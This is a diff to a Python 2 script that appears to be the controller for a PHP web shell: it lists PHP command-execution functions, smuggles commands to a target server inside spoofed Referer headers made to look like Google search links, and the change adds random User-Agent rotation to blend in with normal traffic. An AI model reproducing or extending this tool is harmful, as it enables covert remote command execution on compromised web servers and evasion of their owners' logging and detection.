@@ -1,8 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-from numpy import frombuffer, bitwise_xor, byte
-import getopt, sys, base64, os, urllib2, re, urlparse, os
+import getopt, sys, base64, os, urllib2, re, urlparse, os, random
 
     
 methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]
@@ -362,7 +361,7 @@ class host():
     
     
     try: 
-      ret=self.execHTTPGet(self.genRefUrl(cmdstr))
+      ret=self.execHTTPGet(self.genRefUrl(cmdstr),self.genUserAgent())
     
     except urllib2.URLError, e:
       raise
@@ -410,16 +409,17 @@ class host():
     return self.execute_php(cmnd)
     
     
-  def execHTTPGet(self, refurl):
+  def execHTTPGet(self, refurl, useragent):
     req = urllib2.Request(self.url)
     req.add_header('Referer', refurl)
+    req.add_header('User-Agent', useragent)
     r = urllib2.urlopen(req)
     return r.read()    
   
   def genUserAgent(self):
-    winXP='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
-    ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
-    msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
+    agents = ['Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)' ]
+    
+    return agents[random.randint(0,len(agents)-1)]
     
   def genRefUrl(self,cmdstr):
     #As seen in offical google blog: http://analytics.blogspot.com/2009/04/upcoming-change-to-googlecom-search.html
